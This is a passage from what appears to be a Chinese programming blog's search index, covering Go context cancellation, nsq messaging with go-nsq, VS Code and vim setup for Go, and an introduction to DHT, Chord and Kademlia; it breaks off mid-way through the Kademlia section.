\"监控3\")\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context, name string) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(name, \"监控退出，停止了...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(name, \"goroutine监控中...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控2 goroutine监控中...\n监控3 goroutine监控中...\n监控1 goroutine监控中...\n监控2 goroutine监控中...\n监控3 goroutine监控中...\n可以了，通知监控停止\n监控3 监控退出，停止了...\n监控1 监控退出，停止了...\n监控2 监控退出，停止了...\n\n```\n\n\n示例中启动了3个监控goroutine进行不断的监控，每一个都使用了Context进行跟踪，当我们使用cancel函数通知取消时，这3个goroutine都会被结束。这就是Context的控制能力，它就像一个控制器一样，按下开关后，所有基于这个Context或者衍生的子Context都会收到通知，这时就可以进行清理操作了，最终释放goroutine，这就优雅的解决了goroutine启动后不可控的问题。\n\n\n### Context 接口\n\n```\ntype Context interface {\n\tDeadline() (deadline time.Time, ok bool)\n\tDone() <-chan struct{}\n\tErr() error\n\tValue(key interface{}) interface{}\n}\n```\n\n\n* Deadline方法是获取设置的截止时间的意思，第一个返回式是截止时间，到了这个时间点，Context会自动发起取消请求；第二个返回值ok==false时表示没有设置截止时间，如果需要取消的话，需要调用取消函数进行取消。\n\n* Done方法返回一个只读的chan，类型为struct{}，我们在goroutine中，如果该方法返回的chan可以读取，则意味着parent context已经发起了取消请求，我们通过Done方法收到这个信号后，就应该做清理操作，然后退出goroutine，释放资源。\n\n* Err方法返回取消的错误原因，因为什么Context被取消。\n\n* Value方法获取该Context上绑定的值，是一个键值对，所以要通过一个Key才可以获取对应的值，这个值一般是线程安全的。\n\n\n\n### Context的继承衍生\n\n```\nfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)\nfunc WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)\nfunc WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)\nfunc WithValue(parent Context, key, val interface{}) Context\n```\n\n\n+ value传递数据\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nvar key string = \"name\"\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tvalueCtx := context.WithValue(ctx, key, \"监控1\")\n\tgo watch(valueCtx)\n\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\n\tcancel()\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(ctx.Value(key), \"监控退出，停止了...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(ctx.Value(key), \"goroutine监控中...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n可以了，通知监控停止\n监控1 监控退出，停止了...\n```\n\n\n### Context 使用原则\n\n* 不要把Context放在结构体中，要以参数的方式传递\n* 以Context作为参数的函数方法，应该把Context作为第一个参数，放在第一位。\n* 给一个函数方法传递Context的时候，不要传递nil，如果不知道传递什么，就使用context.TODO\n* Context的Value相关方法应该传递必须的数据，不要什么数据都使用这个传递\n* Context是线程安全的，可以放心的在多个goroutine中传递\n\n","tags":["golang"],"categories":["golang"]},{"title":"nsq介绍和go-nsq使用","url":"%2Fp%2F17c769c4.html","content":"\n### nsq 介绍\n\n[nsq](https://github.com/bitly/nsq)是一个基于Go语言的分布式实时消息平台，nsq可用于大规模系统中的实时消息服务，并且每天能够处理数亿级别的消息，其设计目标是为在分布式环境下运行的去中心化服务提供一个强大的基础架构。\n\n\n\nnsq具有分布式、去中心化的拓扑结构，该结构具有无单点故障、故障容错、高可用性以及能够保证消息的可靠传递的特征。NSQ非常容易配置和部署，且具有最大的灵活性，支持众多消息协议。另外，官方还提供了拆箱即用Go和Python库。如果读者兴趣构建自己的客户端的话，还可以参考官方提供的[协议规范](http://nsq.io/clients/tcp_protocol_spec.html)。\n\n\n\nnsq是由四个重要组件构成：\n\n- [nsqd](http://bitly.github.io/nsq/components/nsqd.html)：一个负责接收、排队、转发消息到客户端的守护进程\n- [nsqlookupd](http://bitly.github.io/nsq/components/nsqlookupd.html)：管理拓扑信息并提供最终一致性的发现服务的守护进程\n- [nsqadmin](http://bitly.github.io/nsq/components/nsqadmin.html)：一套Web用户界面，可实时查看集群的统计数据和执行各种各样的管理任务\n- [utilities](http://nsq.io/components/utilities.html)：常见基础功能、数据流处理工具，如nsq_stat、nsq_tail、nsq_to_file、nsq_to_http、nsq_to_nsq、to_nsq\n\n\n\nnsq的主要特点如下:\n\n- 具有分布式且无单点故障的拓扑结构 支持水平扩展，在无中断情况下能够无缝地添加集群节点\n- 低延迟的消息推送，参见官方提供的[性能说明文档](http://nsq.io/overview/performance.html)\n- 具有组合式的负载均衡和多播形式的消息路由\n- 既擅长处理面向流（高吞吐量）的工作负载，也擅长处理面向Job的（低吞吐量）工作负载\n- 消息数据既可以存储于内存中，也可以存储在磁盘中\n- 实现了生产者、消费者自动发现和消费者自动连接生产者，参见nsqlookupd\n- 支持安全传输层协议（TLS），从而确保了消息传递的安全性\n- 具有与数据格式无关的消息结构，支持JSON、Protocol Buffers、MsgPacek等消息格式\n- 非常易于部署（几乎没有依赖）和配置（所有参数都可以通过命令行进行配置）\n- 使用了简单的TCP协议且具有多种语言的客户端功能库\n- 具有用于信息统计、管理员操作和实现生产者等的HTTP接口\n- 为实时检测集成了统计数据收集器[StatsD](https://github.com/etsy/statsd/)\n- 具有强大的集群管理界面，参见nsqadmin\n\n<!-- more -->\n\n### nsqlookupd(中心管理服务)  4160 4161\n0. nsqlookupd是守护进程负责管理拓扑信息。客户端通过查询 nsqlookupd 来发现指定话题（topic）的生产者，并且 nsqd 节点广播话题（topic）和通道（channel）信息\n\n1. 简单的说nsqlookupd就是中心管理服务，它使用tcp(默认端口4160)管理nsqd服务，使用http(默认端口4161)管理nsqadmin服务。同时为客户端提供查询功能\n\n2. nsqlookupd具有以下功能或特性\n\n* 唯一性，在一个Nsq服务中只有一个nsqlookupd服务。当然也可以在集群中部署多个nsqlookupd，但它们之间是没有关联的\n* 去中心化，即使nsqlookupd崩溃，也会不影响正在运行的nsqd服务\n* 充当nsqd和naqadmin信息交互的中间件\n* 提供一个http查询服务，给客户端定时更新nsqd的地址目录 \n\n\n\n### nsqadmin(展示数据)\n\n0. 是一套 WEB UI，用来汇集集群的实时统计，并执行不同的管理任务\n1. nsqadmin具有以下功能或特性\n    * 提供一个对topic和channel统一管理的操作界面以及各种实时监控数据的展示，界面设计的很简洁，操作也很简单\n    * 展示所有message的数量，恩....装X利器\n    * 能够在后台创建topic和channel，这个应该不常用到\n    * nsqadmin的所有功能都必须依赖于nsqlookupd，nsqadmin只是向nsqlookupd传递用户操作并展示来自nsqlookupd的数据\n\n\n\n### nsqd (真正干活的)  4150 4151\n\n1. nsqd 是一个守护进程，负责接收，排队，投递消息给客户端\n2. 简单的说，真正干活的就是这个服务，它主要负责message的收发，队列的维护。nsqd会默认监听一个tcp端口(4150)和一个http端口(4151)以及一个可选的https端口\n3. nsqd 具有以下功能或特性\n\n* 对订阅了同一个topic，同一个channel的消费者使用负载均衡策略（不是轮询）\n* 只要channel存在，即使没有该channel的消费者，也会将生产者的message缓存到队列中（注意消息的过期处理）\n* 保证队列中的message至少会被消费一次，即使nsqd退出，也会将队列中的消息暂存磁盘上(结束进程等意外情况除外)\n* 限定内存占用，能够配置nsqd中每个channel队列在内存中缓存的message数量，一旦超出，message将被缓存到磁盘中\n* topic，channel一旦建立，将会一直存在，要及时在管理台或者用代码清除无效的topic和channel，避免资源的浪费\n\n#### 消费者\n\n消费者有两种方式与nsqd建立连接\n\n* 消费者直连nsqd，这是最简单的方式，缺点是nsqd服务无法实现动态伸缩了(当然，自己去实现一个也是可以的)  \n* 消费者通过http查询nsqlookupd获取该nsqlookupd上所有nsqd的连接地址，然后再分别和这些nsqd建立连接(官方推荐的做法)，但是客户端会不停的向nsqlookupd查询最新的nsqd地址目录(不喜欢用http轮询这种方式...)\n\n\n\n#### 生产者\n\n生产者必须直连nsqd去投递message(网上说，可以连接到nsqlookupd，让nsqlookupd自动选择一个nsqd去完成投递，但是我用Producer的tcp是连不上nsqlookupd的，不知道http可不可以...)，\n\n这里有一个问题就是如果生产者所连接的nsqd炸了，那么message就会投递失败，所以在客户端必须自己实现相应的备用方案\n\n\n\n* Producer断线后不会重连，需要自己手动重连，Consumer断线后会自动重连\n* Consumer的重连时间配置项有两个功能(这个设计必须吐槽一下，分开配置更好一点)\n\n    * Consumer检测到与nsqd的连接断开后，每隔x秒向nsqd请求重连\n    * Consumer每隔x秒，向nsqlookud进行http轮询，用来更新自己的nsqd地址目录\n    * Consumer的重连时间默认是60s(...菜都凉了)，我改成了1s\n* Consumer可以同时接收不同nsqd node的同名topic数据，为了避免混淆，就必须在客户端进行处理\n* 在AddConurrentHandlers和 AddHandler中设置的接口回调是在另外的goroutine中执行的\n* Producer不能发布(Publish)空message，否则会导致panic\n\n\n\n### nsq 操作\n\n```\nbrew install nsq\n\n\nnsqlookupd\n\n[nsqlookupd] 2018/01/24 10:33:31.710309 nsqlookupd v1.0.0-compat (built w/go1.9.1)\n[nsqlookupd] 2018/01/24 10:33:31.710772 TCP:\nlistening on [::]:4160  --nsqd\n[nsqlookupd] 2018/01/24 10:33:31.710772 HTTP: \nlistening on [::]:4161 --nsqadmin\n\n\nnsqd --lookupd-tcp-address=127.0.0.1:4160 -broadcast-address=127.0.0.1\n\n[nsqd] 2018/01/24 10:35:01.975420 nsqd v1.0.0-compat (built w/go1.9.1)\n[nsqd] 2018/01/24 10:35:01.975521 ID: 660\n[nsqd] 2018/01/24 10:35:01.975567 NSQ: persisting topic/channel metadata to nsqd.dat\n[nsqd] 2018/01/24 10:35:01.976544 TCP: \nlistening on [::]:4150  --tcp监听4150\n[nsqd] 2018/01/24 10:35:01.976597 HTTP: \nlistening on [::]:4151  --http监听4151\n[nsqd] 2018/01/24 10:35:01.976785 LOOKUP(127.0.0.1:4160): adding peer\n\n\nnsqadmin --lookupd-http-address=127.0.0.1:4161\n\n[nsqadmin] 2018/01/24 10:35:40.562980 nsqadmin v1.0.0-compat (built w/go1.9.1)\n[nsqadmin] 2018/01/24 10:35:40.563388 HTTP: \nlistening on [::]:4171 --监听4171\n```\n\n#### use\n\n可以用浏览器访问 http://127.0.0.1:4171/ 观察数据\n也可尝试下 watch -n 0.5 \"curl -s http://127.0.0.1:4151/stats\" 监控统计数据(4151是nsqd的http)\n\n\n发布一个消息 \ncurl -d 'hello world 1' 'http://127.0.0.1:4151/pub?topic=test'\n\n创建一个消费者:\nnsq_to_file --topic=test --output-dir=/tmp --lookupd-http-address=127.0.0.1:4161\n\n\n再发布几个消息\n\n```\ncurl -d 'hello world 2' 'http://127.0.0.1:4151/pub?topic=test'\ncurl -d 'hello world 3' 'http://127.0.0.1:4151/pub?topic=test'\n```\n\n\n\n### go-nsq 使用\n\n运行之前, 保证 nsqd 在运行\n\n```\npackage main\n\nimport (\n\t\"log\"\n\t\"time\"\n\n\tnsq \"github.com/bitly/go-nsq\"\n)\n\nfunc main() {\n\tgo startConsumer()\n\tstartProducer()\n}\n\n// 生产者\nfunc startProducer() {\n\tcfg := nsq.NewConfig()\n\tproducer, err := nsq.NewProducer(\"127.0.0.1:4150\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t// 发布消息\n\tfor {\n\t\tif err := producer.Publish(\"test\", []byte(\"test message\")); err != nil {\n\t\t\tlog.Fatal(\"publish error: \" + err.Error())\n\t\t}\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}\n\n// 消费者\nfunc startConsumer() {\n\tcfg := nsq.NewConfig()\n\tconsumer, err := nsq.NewConsumer(\"test\", \"sensor01\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t// 设置消息处理函数\n\tconsumer.AddHandler(nsq.HandlerFunc(func(message *nsq.Message) error {\n\t\tlog.Println(string(message.Body))\n\t\treturn nil\n\t}))\n\t// 连接到单例nsqd\n\tif err := consumer.ConnectToNSQD(\"127.0.0.1:4150\"); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t<-consumer.StopChan\n}\n\n```\n\n","tags":["nsq"],"categories":["golang"]},{"title":"golang_ide_vscode的使用调试和问题解决","url":"%2Fp%2F127812f2.html","content":"\n\n\n### 安装 vscode后的plugins:\n\n1. go\n2. vscode-icons\n3. code runner\n4. markdown preview github\n5. markdown auto-open\n6. vscode snippets 模板文件: [https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json](https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json)\n7. theme molokai 自带\n   \n\n<!-- more -->\n### vscode增加golang debug调试:\n\n1. xcode-select --install\n\n2. 钥匙链创建证书 dlv-cert\n   \n3. 证书签名\n\n```    \ncd $GOPATH/src/github.com/derekparker\n    \ngit clone https://github.com/derekparker/delve.git  //调试 golang\n    \ncd delve\n    \nCERT=dlv-cert make install\n```\n\n\n\n\n\n### 我的vscode配置文件\n\n> setting.json\n\n```\n{\n    \"files.associations\": {\n        \"*.lua.txt\": \"lua\"\n    },\n    \"files.exclude\": {\n        \"**/.git\": true,\n        \"**/.svn\": true,\n        \"**/.hg\": true,\n        \"**/CVS\": true,\n        \"**/.DS_Store\": true,\n        \"**/*.meta\": true,\n    },\n    \"files.autoSave\": \"afterDelay\",\n    \"workbench.colorTheme\": \"Monokai\",\n    \"workbench.iconTheme\": \"vscode-icons\",\n    \"workbench.editor.enablePreview\": false,\n    \"editor.fontSize\": 14,\n    \"editor.minimap.enabled\": false,\n    \"editor.formatOnType\": true,\n    \"editor.formatOnSave\": true,\n    \"extensions.autoUpdate\": false,\n    \"extensions.ignoreRecommendations\": true,\n    \"window.zoomLevel\": 0,\n    \"luaide.scriptRoots\": [\n        \"/Users/liuwei/workspace/client3-5/Assets/Resources/Lua\"\n    ],\n    \"vim.disableAnnoyingNeovimMessage\": true,\n    \"go.useLanguageServer\": true,\n    \"go.docsTool\": \"gogetdoc\",\n    \"go.buildOnSave\": true,\n    \"go.lintOnSave\": true,\n    \"go.vetOnSave\": true,\n    \"go.buildFlags\": [],\n    \"go.lintFlags\": [],\n    \"go.vetFlags\": [],\n    \"go.coverOnSave\": false,\n    \"go.useCodeSnippetsOnFunctionSuggest\": false,\n    \"go.formatOnSave\": true,\n    \"go.formatTool\": \"goreturns\",\n    \"go.goroot\": \"/usr/local/Cellar/go/1.9.2/libexec\",\n    \"go.gopath\": \"/Users/liuwei/golang\",\n}\n\n```\n\n> launch.json\n\n```\n{\n    // 使用 IntelliSense 了解相关属性。 \n    // 悬停以查看现有属性的描述。\n    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Launch\",\n            \"type\": \"go\",\n            \"request\": \"launch\",\n            \"mode\": \"debug\",\n            \"remotePath\": \"\",\n            \"port\": 2345,\n            \"host\": \"127.0.0.1\",\n            \"program\": \"${fileDirname}\",\n            \"env\": {},\n            \"args\": [],\n            \"showLog\": true\n        }\n    ]\n}\n```\n\n\n\n\n\n\n### vscode 遇到的问题\n\n+ flag provided but not defined: -goversion\n\n一个是版本原因, 一个是vscode也要修改配置gopath, 坑爹\n\n>Thank you, I was able to solve this by running brew uninstall --force go and then downloading the latest installer. Anyone who reads this and wants to use brew you could probably just do brew install go after the forced uninstall. I had to restart my terminal and Gogland after doing this.\n\n+ vscode not jump define\n\n```\n\"go.useLanguageServer\": true,\n\"go.docsTool\": \"gogetdoc\",\n```\n\n+ vscode could not launch process: exec: \"lldb-server\": executable file not found in $PATH\n\n```\nxcode-select --install\n```\n\n\n+ vscode jump slow\n\n安装https://github.com/sourcegraph/go-langserver 源码安装 需要 go install\n\n```\n\"go.useLanguageServer\": true,\n```\n\n\n+ vscode output window hide go\n\n~/.vscode/扩展包/package.json 找到显示的\n\n```\n\"showOutput\": \"never\"\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"vim插件管理_vimrc配置和拷贝系统剪贴板","url":"%2Fp%2F1b9bff9b.html","content":"\n\n### vim-plug 安装\n\n```\nhttps://github.com/junegunn/vim-plug\n\n:PlugInstall 执行安装命令\n```\n\n\n### vim 拷贝到系统剪贴板\n\n1. which vim可以看到当前使用的vim是哪个，vim --version可以看到当前使用的vim支持哪些feature，'+'前缀表示拥有的feature，'-'前缀表示未拥有；\n\n2. '+clipboard'是支持使用系统剪切板的feature；如果你当前使用的vim不支持clipboard，那需要brew upgrade vim装一个新的；\n\n3. 安装新的以后，要把这个新的vim设置为默认vim，通常使用alias设置一下别名，或者通过环境变量设置，或者删掉旧的，做个软连接；\n\n4. 确认+clipboard以后，在.vimrc文件中加入set clipboard=unamed，就可以在vim中使用系统剪切板了\n\n\n<!-- more -->\n\n\n### 我的.vimrc\n\n```\n\" Plugin \ncall plug#begin()\nPlug 'tomasr/molokai' \"主题\nPlug 'ctrlpvim/ctrlp.vim' \"快速查文件\nPlug 'Shougo/neocomplete.vim' \"代码实时提示\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"导航树\nPlug 'jistr/vim-nerdtree-tabs' \"导航树插件\nPlug 'vim-airline/vim-airline' \"状态栏\nPlug 'ervandew/supertab' \"supertab\nPlug 'SirVer/ultisnips' \"代码模板\nPlug 'Valloric/YouCompleteMe' \"table补全\nPlug 'easymotion/vim-easymotion' \"极速跳转\ncall plug#end()\n\n\n\" mapping\nlet mapleader=\",\"\nset mouse=a \"可以用鼠标拖动\nset clipboard=unnamed \"鼠标选中y复制\n\n\n\" easymotion\nlet g:EasyMotion_smartcase = 1\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nnmap s <Plug>(easymotion-overwin-f)\nnmap s <Plug>(easymotion-overwin-f2)\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>w <Plug>(easymotion-w)\nmap <Leader>b <Plug>(easymotion-b)\n\n\n\n\" Color \nsyntax enable\nset t_Co=256\nlet g:rehash256 = 1\nlet g:molokai_original = 1\ncolorscheme molokai\n\n\" Ycm\n\"let g:ycm_server_use_vim_stdout = 1\n\"let g:ycm_server_log_level = 'debug'\n\" make YCM compatible with UltiSnips (using supertab)\nlet g:ycm_key_list_select_completion = ['<C-n>', '<Down>']\nlet g:ycm_key_list_previous_completion = ['<C-p>', '<Up>']\nlet g:SuperTabDefaultCompletionType = '<C-n>'\nlet g:UltiSnipsExpandTrigger = \"<tab>\"\nlet g:UltiSnipsJumpForwardTrigger = \"<tab>\"\nlet g:UltiSnipsJumpBackwardTrigger = \"<s-tab>\"\n\n\n\" Nerdtree\n\"autocmd vimenter * NERDTree \"自动打开Tree\n\"autocmd vimenter * Tagbar \"自动打开TagBar\nnmap <F7> :NERDTreeToggle<CR>\nnmap <F8> :TagbarToggle<CR>\nlet NERDTreeWinSize=20 \"设置nerdtree宽度\nlet g:tagbar_width=20 \"设置宽度，默认为40\n\"let g:nerdtree_tabs_open_on_console_startup=1 \"启动打开nerdtree\nlet g:neocomplete#enable_at_startup = 1 \"代码实时提示\n\"let NERDTreeQuitOnOpen=1 \"打开文件后自动关闭窗口\n\n\" 打开NERDTree,定位到当前文件\nnoremap <silent> <Leader>f :NERDTreeFind<cr> \n\"打开tagbar窗口,跳转后自动关闭,q不跳转直接关闭\nnoremap <silent> <Leader>g :TagbarOpen fjc<cr> \n\" NERDTree tab switch\nmap  <C-l> :tabn<CR>\nmap  <C-h> :tabp<CR>\nmap  <C-o> :tabnew<CR>\n\n\n\" config\nset tabstop=4                   \" 设定tab长度为4\nset shiftwidth=4                \" 缩进的空格数为4\n\nfiletype off                    \" Reset filetype detection first ...\nfiletype plugin indent on       \" ... and enable filetype detection\nset nocompatible                \" Enables us Vim specific features\nset ttyfast                     \" Indicate fast terminal conn for faster \nset ttymouse=xterm2             \" Indicate terminal type for mouse codes\nset ttyscroll=3                 \" Speedup scrolling\nset laststatus=2                \" Show status line always\nset encoding=utf-8              \" Set default encoding to UTF-8\nset autoread                    \" Automatically read changed files\nset autoindent                  \" Enabile Autoindent\nset backspace=indent,eol,start  \" Makes backspace key more powerful.\nset incsearch                   \" Shows the match while typing\nset hlsearch                    \" Highlight found searches\nset noerrorbells                \" No beeps\nset number                      \" Show line numbers\nset showcmd                     \" Show me what I'm typing\nset noswapfile                  \" Don't use swapfile\nset nobackup                    \" Don't create annoying backup files\nset splitright                  \" Vertical windows should be split to right\nset splitbelow                  \" Horizontal windows should split to bottom\nset autowrite                   \" Automatically save before :next, :make etc.\nset hidden                      \" Buffer still exist if window is closed\nset fileformats=unix,dos,mac    \" Prefer Unix over Windows over OS 9 formats\nset noshowmatch                 \" Do not show matching brackets by flickering\nset noshowmode                  \" We show the mode with airline or lightline\nset ignorecase                  \" Search case insensitive...\nset smartcase                   \" but not it begins with upper case\nset completeopt=menu,menuone    \" Show popup menu, even if there is one entry\nset pumheight=10                \" Completion window max size\nset nocursorcolumn              \" Dont highlight column\nset nocursorline                \" Dont highlight cursor\nset lazyredraw                  \" Wait to redraw\nset cursorcolumn\n```","tags":["linux"],"categories":["vim"]},{"title":"dht分布式散列表和kad介绍","url":"%2Fp%2F2c46e603.html","content":"\n\n### 1. 如何实现散列表\n\n+ 在散列表这种数据结构中，会包含 N 个 bucket（桶）。对于某个具体的散列表，N（桶的数量）通常是【固定不变】的。于是可以对每个桶进行编号，从 0 到 N-1。\n\n+ “桶”是用来存储“键值对”的，你可以把它通俗理解成一个动态数组，里面可以存放【多个】“键值对”。\n\n+ 当使用某个 key 进行查找，会先用某个散列函数计算这个 key 的散列值。得到散列值通常是一个整数，然后用散列值对 N（桶数）进行“取模”运算（除法求余数），就可以算出对应的桶编号。（注：取模运算是最常用的做法，但不是唯一的做法）\n\n<!-- more -->\n\n### 2. 分布式散列表 DHT\n\n##### 2.1 P2P 技术路线\n\n- 中央服务器  Napster  ->单点故障\n- 广播   Gnutella 早期版本 ->广播风暴\n- DHT\n\n##### 2.2 DHT 难点\n\n- 无中心 \n\t\n\t需要提供一系列机制来实现节点之间的通讯。\n- 海量数据 \n\t\n\t每个节点只能存储（整个系统的）一小部分数据。需要把数据【均匀分摊】到每个节点。\n- 节点动态变化  \n\n\t统散列表所含的【桶数】是固定不变滴。为啥捏？因为传统散列表在针对 key 计算出散列值之后，需要用“散列值”和“桶数”进行某种运算（比如：取模运算），从而得到桶的编号。如果桶的数量出现变化，就会影响到上述“取模运算”的结果，然后导致数据错乱。\n\n- 高效查询\n\n##### 2.3 DHT 难点解决\n\n- 散列算法的选择\n\n\tDHT业务数据的散列值作为Key,业务数据为Value, 所以要避免碰撞\n\n- 同构的 nodeID 和 data key\n\n\tDHT 属于分布式系统的一种。既然是分布式系统，意味着存在【多个】节点\n\t\n\t很多 DHT 的设计会让“node ID”采用跟“data key”【同构】的散列值。这么搞的好处是\n\t1、当散列值空间足够大的时候，随机碰撞忽略不计，因此也就确保了 node ID 的唯一性 2、可以简化系统设计——比如简化路由算法\n\t\n- “拓扑结构”的设计\n\n\t作为分布式系统，DHT 必然要定义某种拓扑结构；有了拓扑结构，自然就要设计某种“路由算法”。如果某个 DHT 采用前面所说的——“node ID”与“data key”【同构】——那么很自然的就会引入“Key-based routing”。\n\t\n\t请注意，这【不是】某个具体的路由算法，而只是某种【风格】。采用这种风格来设计路由机制，好处是：key 本身已经提供了足够多的路由信息。\n\n- “路由算法”的权衡\n\n  由于 DHT 中的节点数可能非常多（比如：几十万、几百万），而且这些节点是动态变化的。因此就【不可能】让每一个节点都记录所有其它节点的信息。实际情况是：每个节点通常只知道少数一些节点的信息。\n\n  在确定了路由算法之后，还需要做一个两难的权衡——“路由表的大小”。\n  路由表越大，可以实现越短（跳数越少）的路由；缺点是：（由于节点动态变化）路由表的维护成本也就越高。\n  路由表数越小，其维护成本越小；缺点是：路由就会变长（跳数变多）。\n\n- 距离算法\n\n   某些 DHT 系统还会定义一种“距离算法”，用来计算：“节点之间的距离”、“数据之间的距离”、“节点与数据的距离”。\n\n   写到这里，某些聪明的读者就会明白：为啥前面要强调——“node ID”与“data key”【同构】。当这两者【同构】，就可以使用【同一种“距离算法”】；反之，如果这两者不同构，多半要引入几种不同的“距离算法”。\n\n- 数据定位\n\n\t+ 保存数据\n\t\t\n\t\t当某个节点得到了新加入的数据（K/V），它会先计算自己与新数据的 key 之间的“距离”；然后再计算它所知道的其它节点与这个 key 的距离。\n\t\t\n\t\t如果计算下来，自己与 key 的距离最小，那么这个数据就保持在自己这里。否则的话，把这个数据转发给距离最小的节点。收到数据的另一个节点，也采用上述过程进行处理（递归处理）。\n\n\t+ 获取数据\n\n\t   当某个节点接收到查询数据的请求（key），它会先计算自己与 key 之间的“距离”；然后再计算它所知道的其它节点与这个 key 的距离。\n\t\n\t  如果计算下来，自己与 key 的距离最小，那么就在自己这里找有没有 key 对应的 value。有的话就返回 value，没有的话就报错。否则的话，把这个数据转发给距离最小的节点。收到数据的另一个节点，也采用上述过程进行处理（递归处理）。\n\n### 3. Chord 协议\n\n+ 概述\n\nChord 诞生于2001年。第一批 DHT 协议都是在那年涌现的，另外几个是：CAN、Tapestry、Pastry。\n\n\n+ 拓扑结构——环形\n\t\n\t当初设计“一致散列”主要是为了解决“节点动态变化”这个难点（前面有提及）。为了解决这个难点，“一致散列”把散列值空间（keyspace）构成一个【环】。对于 m 比特的散列值，其范围是 [0, 2m-1]。你把这个区间头尾相接就变成一个环，其周长是 2m。然后对这个环规定了一个移动方向（比如顺时针）。\n\t\n\t\n\t假设有某个节点A，距离它最近的是节点B（以顺时针方向衡量距离）。那么称 B 是 A 的【继任】（successor），A 是 B 的【前任】（predecessor）。\n\n\t```\n\t数据隶属于【距离最小】的节点。以 m=6 的环形空间为例：\n\t数据区间 [5,8] 隶属于节点8\n\t数据区间 [9,15] 隶属于节点15\n\t......\n\t数据区间 [59,4] 隶属于节点4（注：“6比特”的环形空间，63之后是0）\n\t```\n\n\n+ 路由机制\n\n\t- 基本路由（简单遍历）\n\n\t\t当收到请求（key），先看 key 是否在自己这里。如果在自己这里，就直接返回信息；否则就把 key 转发给自己的继任者。以此类推。\n\t　　这种玩法的时间复杂度是 O(N)。对于一个节点数很多的 DHT 网络，这种做法显然非常低效。\n\t\n\t- 高级路由（Finger Table）\n\n\t\t“Finger Table”是一个列表，最多包含 m 项（m 就是散列值的比特数），每一项都是节点 ID。 每一个节点都有个路由表\n\t\t\n\t\t\n\t\t假设当前节点的 ID 是 n，那么表中第 i 项的值是：successor( (n + 2i) mod 2m ) 当收到请求（key），就到“Finger Table”中找到【最大的且不超过 key】的那一项，然后把 key 转发给这一项对应的节点。有了“Finger Table”之后，时间复杂度可以优化为 O(log N)。`跳跃式查询`\n\t\t\n\n+ 节点的加入\n\n\t- 任何一个新来的节点（假设叫 A），需要先跟 DHT 中已有的任一节点（假设叫 B）建立连接。\n\t- A 随机生成一个散列值作为自己的 ID（对于足够大的散列值空间，ID 相同的概率忽略不计）\n\t- A 通过跟 B 进行查询，找到自己这个 ID 在环上的接头人。也就是——找到自己这个 ID 对应的“继任”（假设叫 C）与“前任”（假设叫 D）\n\t- 　接下来，A 需要跟 C 和 D 进行一系列互动，使得自己成为 C 的前任，以及 D 的继任。这个互动过程，大致类似于在双向链表当中插入元素\n\n+ 节点的【正常】退出\n\n\t- 如果某个节点想要主动离开这个 DHT 网络，按照约定需要作一些善后的处理工作。比如说，通知自己的前任去更新其继任者......\n　　这些善后处理，大致类似于在双向链表中删除元素\n\n+ 节点的【异常】退出\n\n\t- 作为一个分布式系统，任何节点都有可能意外下线（也就是说，来不及进行善后就挂掉了）\n\n\t\t假设 节点A 的继任者【异常】下线了，那么 节点A 就抓瞎了。咋办捏？为了保险起见，Chord 引入了一个“继任者候选列表”的概念。每个节点都用这个列表来包含：距离自己最近的 N 个节点的信息，顺序是【由近到远】。一旦自己的继任者下线了，就在列表中找到一个【距离最近且在线】的节点，作为新的继任者。然后 节点A 更新该列表，确保依然有 N 个候选。更新完“继任者候选列表”后，节点A 也会通知自己的前任，那么 A 的前任也就能更新自己的“继任者候选列表”。\n\t\t\n\t\t\n### 4. Kademlia（Kad）协议\n\n\n+ 拓扑结构——二叉树\n\n\t- 散列值的预处理\n\n\t\tKad 也采用了“node ID 与 data key 同构”的设计思路。然后 Kad 采用某种算法把 key 映射到一个二叉树，每一个 key 都是这个二叉树的【叶子】。在映射之前，先做一下预处理。\n\t\t1. 先把 key 以二进制形式表示。\n\t\t2. 把每一个 key 缩短为它的【最短唯一前缀】。\n\n\t\n\t- 散列值的映射\n\n\t\t完成上述的预处理后，接下来的映射规则是：\n\t\n\t\t1. 先把 key 以二进制形式表示，然后从高位到低位依次处理。\n\t\t2. 二进制的第 n 个数位就对应了二叉树的第 n 层\n\t\t3. 